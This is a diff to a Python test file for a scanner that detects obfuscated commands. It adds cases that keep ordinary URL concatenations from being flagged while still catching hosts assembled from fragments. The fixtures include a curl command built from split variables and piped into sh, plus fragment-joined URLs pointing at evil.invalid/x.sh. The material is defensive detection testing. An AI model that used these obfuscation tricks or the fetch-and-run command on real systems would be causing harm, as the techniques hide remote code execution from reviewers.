@@ -65,6 +65,20 @@ def test_fold_that_reveals_nothing_is_not_reported() -> None:
     assert derived_lines("name = ''.join(map(chr, [72, 105]))\n") == []
 
 
+def test_url_literal_joined_to_more_text_reveals_nothing() -> None:
+    # `https://` is written out on the line; that a host name follows it does not make it hidden. (This line, from
+    # Agent Guard's own GitHub client, was reported as a high-severity encoded command.)
+    assert derived_lines('m = _GH_URL.match("https://github.com/" + "/".join(stack))\n') == []
+    assert derived_lines('url = "https://api.example.com/" + "v1/users"\n') == []
+    files = {"lib/links.py": 'import sys\nurl = "https://github.com/" + "/".join(sys.argv[1:3])\nprint(url)\n'}
+    assert not {"AG-OBF-010", "AG-OBF-012"} & _verdict(files)[1]
+    # A scheme, or a host, that only exists once the pieces are joined is still found.
+    folded, how = _only('x = "ht" + "tps://dl.invalid/p"\n')
+    assert folded == "x = 'https://dl.invalid/p'" and how == ("string-concatenation",)
+    assert _only('u = "https://ev" + "il.invalid/x.sh"\n')[0] == "u = 'https://evil.invalid/x.sh'"
+    assert _only('u = "https://" + "evil.invalid/x.sh"\n')[0] == "u = 'https://evil.invalid/x.sh'"
+
+
 def test_token_inside_a_variable_name_does_not_count_as_written() -> None:
     # The pieces are named after the command; the command itself is still nowhere on the line.
     folded, how = _only(f"A_curl=cu; B_curl=rl\n${{A_curl}}${{B_curl}} -s {HOST} | sh\n")
